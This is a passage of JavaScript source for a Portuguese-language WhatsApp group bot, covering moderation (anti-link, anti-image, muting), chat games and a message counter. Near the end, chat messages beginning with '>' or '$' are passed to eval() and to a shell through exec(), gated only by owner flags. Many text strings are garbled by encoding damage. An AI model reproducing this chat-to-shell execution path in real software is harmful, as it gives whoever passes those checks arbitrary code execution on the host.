if(isGroup && dataGp[0].ausentes?.length > 0 && menc_jid2?.length > 0 && JSON.stringify(dataGp[0].ausentes).includes(menc_jid2)) {
blue = [] 
for (i of menc_jid2) {
if(groupAdmins.indexOf(String(i)) != -1) blue.push(groupAdmins.indexOf(String(i)))
}
if(blue.length == 0) return
big = [] 
for ( i of blue) {
big.push(groupAdmins[i])
}
blr = []
for ( i = 0; i < big.length; i++) {
blr.push(dataGp[0].ausentes[dataGp[0].ausentes.map(i => i.id).indexOf(big[i])])
}
for ( i of blr) {
var blak = i
}
await mention(mess.absenceRecordAdmin(blak))
}

if(isBotGroupAdmins && isGroupAdmins && body === "apaga") {
if(!menc_prt) return
await yoko.sendMessage(from, {delete: { remoteJid: from, fromMe: false, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: menc_prt}});
}

if(!isVip && nescessario.cmd_vip.includes(command)) return reply(mess.onlyVipUser());


//========================================\\

//BAN GRUPO & BOT OFF
if(isGroup && isCmd && isBanchat && !SoDono) return

if(isGroup && isCmd && So_Adm && !SoDono && !isGroupAdmins) return

if(isBotoff && !SoDono) return

//=======================================\\

const sendStickerFromUrl = async(to, url) => {
try {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './yoko/sticker' + names + '.png', async function () {
let filess = './yoko/sticker' + names + '.png'
let asw = './yoko/sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, async(err) => {
let media = fs.readFileSync(asw)
await yoko.sendMessage(to, {sticker: media}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: selo}).catch(async(error) => {
return reply(mess.error())
})
DLT_FL(filess)
DLT_FL(asw)
});
});
} catch {
return reply(mess.error())
}
}

//=========(isQuoted/consts)=============\\

const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isVisuU2 = type == 'viewOnceMessageV2'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage' || type == "viewOnceMessage" || type == "viewOnceMessageV2")
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if(isImage) typeMessage = "Image"
else if(isVideo) typeMessage = "Video"
else if(isAudio) typeMessage = "Audio"
else if(isSticker) typeMessage = "Sticker"
else if(isContact) typeMessage = "Contact"
else if(isLocation) typeMessage = "Location"
else if(isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('conversation')

const isQuotedMsg2 = type === 'extendedTextMessage' && content.includes('text')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVisuU = type === 'extendedTextMessage' && content.includes('viewOnceMessage')

const isQuotedVisuU2 = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedDocW = type === 'extendedTextMessage' && content.includes('documentWithCaptionMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
            
// ANTI DDD - LISTA COMPLETA DE DDDs EXISTENTES NO BRASIL!
const arrayDDDs = [11, 12 ,13 ,14 ,15, 16, 17, 18, 19, 21, 22, 24 , 27, 28, 31, 32, 33, 34, 35, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 53, 54, 55,61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 73, 74,75, 77, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89,91, 93, 94, 95, 96, 97, 98, 99];

//////BLOCK CMD///////

//(CREDITOS AO KAUAN GAY)\\
//==========(REGISTRO)==================\\

if(isGroup){
const checar = getComandos(from)
if(checar === undefined) addComandosId(from)
}
if(isGroup && isCmd && !SoDono && !isnit && getComandoBlock(from).includes(command)) return reply('O comando foi bloqueado, entre em contato com a administraÃ§Ã£o.')

///BLOCK CMD GLOBAL///
///(CRÃ‰DITOS AO @VictorGabriel)///
if(isBlockCmdG.includes(command) && !SoDono) return reply('OlÃ¡, o comando estÃ¡ bloqueado para *uso global*, ou seja, todos os usuÃ¡rios estÃ£o impossibilitados de usar ele.\nâ€“\nâ€¢ Entre em contato com meu proprietÃ¡rio para saber o motivo.')

////FIMMMMMMMMM/////

///// FIMMMMMMMMMMMMM /////

const dattofc = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY')
const hourofc = moment.tz('America/Sao_Paulo').format('HH:mm:ss')

const MessageType = type == 'audioMessage' ? 'Ãudio' : type == 'stickerMessage' ? 'Figurinha' : type == 'imageMessage' ? 'Imagem' : type == 'videoMessage' ? 'VÃ­deo' : type == 'documentMessage' ? 'Documento' : type == 'contactMessage' ? 'Contato' : type == 'locationMessage' ? 'LocalizaÃ§Ã£o' : info.message?.reactionMessage?.text ? `ReaÃ§Ã£o '${info.message.reactionMessage.text}'` : 'Texto';
if(!isGroup && isCmd) console.log(`â•­â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•®
â•‘ âŸ¨ AYANOKOJI MD âŸ©
â•‘ âÍœ Comando-privado:` +colors.cyan(MessageType),
  `\nâ•‘ âÍœ Nome:` +colors.cyan(pushname), 
  `\nâ•‘ âÍœ ID:` +colors.cyan(sender.split("@")[0]),
  `\nâ•‘ âÍœ Data & Hora:` +colors.cyan(hourofc, dattofc),
  `\nâ•°â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¯`)
   
   if(!isGroup && !isCmd && !info.key.fromMe) console.log(`â•­â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•®
  â•‘ âŸ¨ AYANOKOJI MD âŸ©
  â•‘ âÍœ Mensagem-privado:` +colors.cyan(MessageType),
    `\nâ•‘ âÍœ Nome:` +colors.cyan(pushname), 
    `\nâ•‘ âÍœ ID:` +colors.cyan(sender.split("@")[0]),
    `\nâ•‘ âÍœ Data & Hora:` +colors.cyan(hourofc, dattofc),
    `\nâ•°â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¯`);
   
   if (!isCmd && isGroup && !info.key.fromMe) console.log(`â•­â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•®\nâ•‘ âŸ¨ AYANOKOJI MD âŸ©\nâ•‘ âÍœ Mensagem-grupo:` +colors.cyan(MessageType),
    `\nâ•‘ âÍœ Grupo:` +colors.cyan(groupName), 
    `\nâ•‘ âÍœ Data & Hora:` +colors.cyan(hourofc, dattofc),
    `\nâ•°â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¯`);
  
    if (isCmd && isGroup) console.log(`â•­â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•®\nâ•‘ âŸ¨ AYANOKOJI MD âŸ©\nâ•‘ âÍœ Comando-grupo:` +colors.cyan(MessageType),
      `\nâ•‘ âÍœ Grupo:` +colors.cyan(groupName), 
      `\nâ•‘ âÍœ Data & Hora:` +colors.cyan(hourofc, dattofc),
      `\nâ•°â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¯`);
  
// ========= || Jogo da Velha || ======== \\
async function startJogoDaVelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if(fs.existsSync(`./yoko/bunker//tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if(budy == "Cex") return reply("why");
if(budy.toLowerCase() == "s" || budy.toLowerCase() == "sim" || budy.toLowerCase() == "ok") {
if(boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if(boardnow.status) return;
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./yoko/bunker//tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*ğŸ®á€Ì¸áªÌ¸á·Ì¸á¬Ì¸ á Ì¸áªÌ¸ á™Ì¸á¬Ì¸áÌ¸á»Ì¸áªÌ¸ğŸ•¹ï¸*\nâ€”\nğŸš¨ ExplicaÃ§Ã£o: _O(a) jogador '@${boardnow.X}' estÃ¡ denominada com emoji 'X', jÃ¡ o 2Â° jogador(a) que seria o(a) '@${boardnow.O}' estÃ¡ denominado(a) o emoji de cÃ­rculo._\nâ€¢ ComeÃ§ou a disputa! Quem irÃ¡ decidir a primeira jogada Ã© vocÃª: *'@${boardnow.turn == "X" ? boardnow.X : boardnow.O}*'\nâ€”\n${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}\n${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}\n${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}`;
mention(chatAccept);
}
} else if(
budy.toLowerCase() == "n" ||
budy.toLowerCase() == "nÃ£o" ||
budy.toLowerCase() == "no"
) {
if(boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if(boardnow.status) return reply(`O jogo comeÃ§ou ou jÃ¡ existe uma partida aberta neste grupo! Por favor, caso ninguÃ©m esteja jogando ou houve um erro desconhecido na funÃ§Ã£o, entre em contato com o criador ou solicite Ã  um adm para usar o  comando '${prefix}resetvelha' no grupo.`);
DLT_FL(`./yoko/bunker//tictactoe/db/${from}.json`);
mention(`Nossa @${boardnow.X}, infelizmente o seu oponente nÃ£o aceitou seu desafio!, âŒğŸ˜•`)
joguinhodavelhajs.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if(arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if(!boardnow.status) return reply(`Parece que seu oponente nÃ£o aceitou o desafio ainda.`)
if((boardnow.turn == "X" ? boardnow.X : boardnow.O) != sender.replace("@s.whatsapp.net", "")) return;
const moving = validmove(Number(budy), `${from}`);
const matrix = moving._matrix;
if(moving.isWin) {
if(moving.winner == "SERI") {
reply(`Ocorreu um empate! ğŸ˜¨ Os dois ganharam, meus parabÃ©ns! Porque vocÃªs nÃ£o iniciam outra partida para tirar a limpo, quem Ã© o melhor?`);
DLT_FL(`./yoko/bunker//tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
setTimeout(() => {
if(fs.existsSync("./yoko/bunker//tictactoe/db/" + from + ".json")) {
DLT_FL("./yoko/bunker//tictactoe/db/" + from + ".json");
reply(`O *jogo da velha* foi cancelado por falta de movimentaÃ§Ã£o no tabuleiro ou o desafiado nÃ£o aceitou no prazo de 5 minutos.`);
} else {
console.log(colors.red(time), colors.magenta("[ EXPIRADO ]"), colors.red('Jogo da velha espirado..'));
}
joguinhodavelhajs.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
await mention(`ParabÃ©ns *@${winnerJID}*, vocÃª ganhou a partida do jogo da velha! ğŸ˜ Mas, parabÃ©ns aos ambos jogadores, vocÃªs foram bem, mas perder nÃ£o Ã© o fim, perder Ã© um comeÃ§o de uma vitÃ³ria em sua vida.. NÃ£o desista por uma pequena derrota! â™¦ï¸ğŸ¯`)   
DLT_FL(`./yoko/bunker//tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./yoko/bunker/database/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
mention(`*ã€ ğŸ® á€Ì¸áªÌ¸á·Ì¸á¬Ì¸ á Ì¸áªÌ¸ á™Ì¸á¬Ì¸áÌ¸á»Ì¸áªÌ¸ ğŸ•¹ï¸ ã€*\nâ€”\n*@${boardnow.X}* VS @${boardnow.O}\nâ€¢ Agora Ã© a vez do jogador(a): @${moving.turn == "X" ? moving.X : moving.O}\nâ€”\n${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}\n${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}\n${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}`);
}
} 
} 
}

// LOADING

async function carregamento() {
txt1 = `_ğŸ”¥âƒŸã€­ã€¬á®ªÛ¬Ì‡âƒŸË–êª¶ğ™¾ğš‹ğšğšğš—ğšğš˜ ğš›ğšğšœğšğš•ğšğšŠğšğš˜ğšœê¦½ê¦¼Ì·à§§_\n_ã€ÊŸá´á´€á´…ÉªÉ´É¢ã€:`
var carre = [
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™10%`,
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’ã€™35%`,
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€™51%`,
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ã€™62%`,
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ã€™80%`,
`${txt1}ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€™100%`,
`_á­¥ê©Œã‚šà»‹ @${sender.split("@")[0]}_\n_â€¢ Pesquisa realizada, Aguarde um pouco para ser enviado.._`]
let { key } = await yoko.sendMessage(from, {text: `_á­¥ê©Œã‚šà»‹ Ok @${sender.split("@")[0]}_\n_â€¢ Obtendo os resultados de sua pesquisa.._`, mentions: [sender]}, {quoted: selo})
for (let i = 0; i < carre.length; i++) {
await yoko.sendMessage(from, {text: carre[i], mentions: [sender], edit: key });
}
}

async function loading() {
txt1 = `_ğŸ”¥âƒŸã€­ã€¬á®ªÛ¬Ì‡âƒŸË–êª¶ğ™¾ğš‹ğšğšğš—ğšğš˜ ğš›ğšğšœğšğš•ğšğšŠğšğš˜ğšœê¦½ê¦¼Ì·à§§_\n_ã€ÊŸá´á´€á´…ÉªÉ´É¢ã€:`
var carre = [
`${txt1}ã€˜â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™10%_`,
`${txt1}ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’ã€™30%_`,
`${txt1}ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€™50%_`,
`${txt1}ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ã€™70%_`,
`${txt1}ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’ã€™90%_`,
`${txt1}ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€™100%_`,
`_á­¥ê©Œã‚šà»‹ @${sender.split("@")[0]}_\n_â€¢ Pesquisa realizada, Aguarde um pouco para ser enviado.._`]
let { key } = await yoko.sendMessage(from, {text: `_á­¥ê©Œã‚šà»‹ Ok @${sender.split("@")[0]}_\n_â€¢ Obtendo os resultados de sua pesquisa.._`, mentions: [sender]}, {quoted: selo})
for (let i = 0; i < carre.length; i++) {
await yoko.sendMessage(from, {text: carre[i], mentions: [sender], edit: key });
}
}

const largeNumber = (value) => {
  if(Number(value) < 0) return "O nÃºmero precisa ser â‰¥ 0"
  nmr = `${Number(value).toFixed(0)}`
  if(nmr.length >= 4) {
    const existPoint = (nmr) => {
      if(Number(nmr) !== 0) return "." + `${nmr}`
      return ``
    }
    if(nmr.length >= 4) txt = nmr.slice(0, (nmr.length - 3)) + existPoint(nmr.slice((nmr.length - 3), (nmr.length - 2))) + "K"
    if(nmr.length >= 7) txt = nmr.slice(0, (nmr.length - 6)) + existPoint(nmr.slice((nmr.length - 6), (nmr.length - 5))) + "M"
    if(nmr.length >= 10) txt = nmr.slice(0, (nmr.length - 9)) + existPoint(nmr.slice((nmr.length - 9), (nmr.length - 8))) + "B"
    if(nmr.length >= 13) txt = nmr.slice(0, (nmr.length - 12)) + existPoint(nmr.slice((nmr.length - 12), (nmr.length - 11))) + "T"
  } else { txt = nmr }
  return txt
}

// NAMORO
if(budy2.toLowerCase() === "s" || budy2.toLowerCase() === "sim") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
namoro1[C12].namorados = true
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro1.push({usu1: sender, usu2: namoro2[C14].pedido, namorados: true, idgp: from, hora: hourofc, data: dattofc})
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./yoko/bunker/database/func/namoro2.json", JSON.stringify(namoro2))
mention(`ğŸ¥³ FelicitaÃ§Ãµes @${namoro1[C12].usu1.split('@')[0]}! O (a) seu grande amor, @${sender.split('@')[0]}, aceitou o seu pedido de namoro.\nSeu par pode ser consultado no comando: ${prefix}minhadupla`)
}
}

if(budy2.toLowerCase() === "n" || budy2.toLowerCase().replace("Ã£", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} nÃ£o te ama, deve estÃ¡ confuso(a) ou nÃ£o preparado(a) e por isso nÃ£o aceitou o seu pedido de namoro. ğŸ˜¦`)
namoro1.splice(C12, 1)
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./yoko/bunker/database/func/namoro2.json", JSON.stringify(namoro2))
}
}

startJogoDaVelha()

if(isAntilinkgp && isGroup && isBotGroupAdmins && !isGroupAdmins) {
if(Procurar_String.includes("chat.whatsapp.com/")){
if(isBot) return 
link_dgp = await yoko.groupInviteCode(from)
if(Procurar_String.match(link_dgp)) return reply('Link do nosso grupo, nÃ£o irei remover.. ')  
if(IS_DELETE) {
setTimeout(() => {
yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return
yoko.groupParticipantsUpdate(from, [sender], 'remove')
}
}

const groupIdscount = [];
for(let obj of countMessage) {
groupIdscount.push(obj.groupId);
}

// MUTAR USUÃRIO 
 if(!muted.some(i => i.grupo === from) && isGroup) {
  muted.push({grupo: from, usus: []});
  fs.writeFileSync("./yoko/bunker/database/grupos/muted.json", JSON.stringify(muted, null, 2));
  }
  
if(isGroup && muted[muted.map(i => i.grupo).indexOf(from)].usus.includes(sender)) {
  await yoko.sendMessage(from, {text: `ğŸ¤« Hmm @${sender.split("@")[0]}, achou que ia passar despercebido? Achou errado lindo(a)! VocÃª estÃ¡ sendo removido por enviar mensagem, sendo que vocÃª estÃ¡ mutado neste grupo.`, mentions: [sender]}, {quoted: selo});
  await yoko.sendMessage(from, {delete: {remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
  await yoko.groupParticipantsUpdate(from, [sender], 'remove');
  // ApÃ³s a remoÃ§Ã£o do participante mutado, automaticamente ele vai ser removido da lista de usuÃ¡rios mutados do grupo. â™¦ï¸
  muted[muted.map(i => i.grupo).indexOf(from)].usus.splice(sender);
  fs.writeFileSync("./yoko/bunker/database/grupos/muted.json", JSON.stringify(muted, null, 2));
}


// VERDADE OU DESAFIO\\

//const fs = require('fs');
//const path = require('path');

// Caminho para o arquivo JSON
const filevddf = path.join(__dirname, './yoko/bunker/vdd-dsf/verdade-desafio.json');
//const filevddf = require('./yoko/bunker/vdd-dsf/verdade-desafio.json')
// FunÃ§Ã£o para ler o arquivo JSON
function lerDados() {
    try {
        const data = fs.readFileSync(filevddf, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error('Erro ao ler o arquivo JSON', err);
        return { verdade: [], desafio: [] };
    }
}

// FunÃ§Ã£o para salvar no arquivo JSON
function salvarDados(dados) {
    try {
        fs.writeFileSync(filevddf, JSON.stringify(dados, null, 2), 'utf8');
        console.log('Dados salvos com sucesso!');
    } catch (err) {
        console.error('Erro ao salvar os dados no arquivo JSON', err);
    }
}

// FunÃ§Ã£o para escolher aleatoriamente uma pergunta ou desafio
function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// FunÃ§Ã£o principal do jogo
function jogoVerdadeOuDesafio(escolha) {
    const dados = lerDados();

    if (escolha.toLowerCase() === 'verdade') {
        const pergunta = getRandomElement(dados.verdade);
       // console.log(`Verdade: ${pergunta}`);
       // return pergunta
       reply(pergunta)
    } else if (escolha.toLowerCase() === 'desafio') {
        const desafio = getRandomElement(dados.desafio);
        console.log(`Desafio: ${desafio}`);
        return desafio
    } else {
        console.log('Escolha invÃ¡lida! Digite "verdade" ou "desafio".');
    }
}

// FunÃ§Ã£o para adicionar uma nova pergunta ou desafio
function adicionarPerguntaOuDesafio(tipo, conteudo) {
    const dados = lerDados();

    if (tipo.toLowerCase() === 'verdade') {
        dados.verdade.push(conteudo);
        console.log('Nova pergunta de verdade adicionada!');
    } else if (tipo.toLowerCase() === 'desafio') {
        dados.desafio.push(conteudo);
        console.log('Novo desafio adicionado!');
    } else {
        console.log('Tipo invÃ¡lido! Use "verdade" ou "desafio".');
        return;
    }

    salvarDados(dados);
}

// Exemplo de como o sistema pode ser usado:

// Jogar uma rodada de Verdade ou Desafio
//jogoVerdadeOuDesafio('verdade');
//jogoVerdadeOuDesafio('desafio');

// Adicionar nova pergunta ou desafio
//adicionarPerguntaOuDesafio('verdade', 'VocÃª jÃ¡ teve um caso com alguÃ©m mais velho?');
//adicionarPerguntaOuDesafio('desafio', 'Dance como se ninguÃ©m estivesse assistindo e mande um vÃ­deo.');







//====(CONTADOR-DE-MENSAGENS)=======\\
var numbersIds = []
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
var RSM_CN = countMessage[ind].numbers[indnum]
type == "stickerMessage" ? "" : RSM_CN.messages += isCmd ? 0 : 1
type == "stickerMessage" ? "" : RSM_CN.cmd_messages += isCmd ? 1 : 0
type == "stickerMessage" ? "" : RSM_CN.aparelho = adivinha
RSM_CN.figus += type == "stickerMessage" ? 1 : 0
fs.writeFileSync('./yoko/configs/media/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = isCmd ? 0 : 1
const cmd_messages = isCmd ? 1 : 0
var figus = type == "stickerMessage" ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages, 
aparelho: adivinha, 
figus: figus
})
fs.writeFileSync('./yoko/configs/media/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
figus: 0,
cmd_messages: isCmd ? 1 : 0, 
aparelho: adivinha
}]
})
fs.writeFileSync('./yoko/configs/media/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}

// PARA LIMPAR OS DADOS DOS USUÃRIOS QUE JÃ SAIU DO GRUPO...
async function ClearMembersInactive() {
var RD_CNT = countMessage[countMessage.map(i => i.groupId).indexOf(from)].numbers
CNT1 = []; for ( i of groupMembers) {CNT1.push(i.id)} 
CNT = []; for ( i of RD_CNT) {
if(!CNT1.includes(i.id)) CNT.push(i)}
for ( i of CNT) {
RD_CNT.splice(RD_CNT.map(i => i.id).indexOf(i.id), 1)}
fs.writeFileSync("./yoko/configs/media/countmsg.json", JSON.stringify(countMessage, null, 2))
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//=========(EVAL-EXECUÃ‡Ã•ES)=========\\

if(budy.startsWith('>')){
try {
if(info.key.fromMe) return 
if(!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return
return yoko.sendMessage(from, {text: JSON.stringify(eval(budy.slice(2)),null,'\t')}).catch(e => {
return reply(String(e))
})
} catch (e){
return reply(String(e))
}
}

if(budy.startsWith('(>')){
try {
if(info.key.fromMe) return   
if(!SoDono && !isnit && !issupre && !ischyt && !issupre && !ischyt) return 
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if(sat == undefined){
bang = util.format(sul)
}
return yoko.sendMessage(from, {text: bang}, {quoted: selo})
}
yoko.sendMessage(from, {text: util.format(eval(`;(async () => { ${konsol} })()`))}).catch(e => { 
return reply(String(e))
})
} catch(error) {
return reply(String(error));
}
}

if(body.startsWith('$')) {
if(info.key.fromMe) return 
if(!SoDono && !isnit) return 
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if(stdout) {
reply(stdout)
}
})
}
/*
if(body != undefined) { /* CrÃ©ditos: @Matheus 
if(!JSON.stringify(pushnames).includes(botNumber)) {
pushnames.push({id: botNumber, nick: NomeDoBot});
fs.writeFileSync("./yoko/bunker/database/usuarios/users.json", JSON.stringify(pushnames, null, 2));
}
if(!JSON.stringify(pushnames).includes(sender)) {
pushnames.push({id: sender, nick: pushname});
fs.writeFileSync("./yoko/bunker/database/usuarios/users.json", JSON.stringify(pushnames, null, 2));
} else {
pushnames[pushnames.map(i => i.id).indexOf(sender)].nick = pushname
fs.writeFileSync("./yoko/bunker/database/usuarios/users.json", JSON.stringify(pushnames, null, 2));
}
}
*/
//======================================\\


//======(ANTI-IMAGEM)========\\
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: selo});
if(dataGp[0].legenda_imagem != "0") {
await yoko.sendMessage(from, {text: dataGp[0].legenda_imagem}, {quoted: selo});
}
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500);
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

//======(ANTI-STICKER)========\\
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: selo});
await yoko.sendMessage(from, {text: mess.messageProhibitedDetUser()}, {quoted: selo});
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}});
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
await yoko.groupParticipantsUpdate(from, [sender], 'remove');
}

if(Antidoc && isBotGroupAdmins && type == 'documentMessage') {
if(info.key.fromMe) return
if(isGroupAdmins) return await yoko.sendMessage(from, {text: mess.messageProhibitedDetAdmin()}, {quoted: selo})
if(dataGp[0].legenda_documento != "0") {
await yoko.sendMessage(from, {text: dataGp[0].legenda_documento}, {quoted: selo}) 
}
if(IS_DELETE) {
setTimeout(async() => {
await yoko.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.key.id, participant: sender}})
}, 500)
}
if(!JSON.stringify(groupMembers).includes(sender)) return  
await yoko.groupParticipantsUpdate(from, [sender], 'remove')
}

let isTrueFalse = Array('tiktok', 'facebook','instagram','twitter','ytmp3','ytmp4','play', 'kwai', 'playdoc', 'playvid').some(item => item === command)

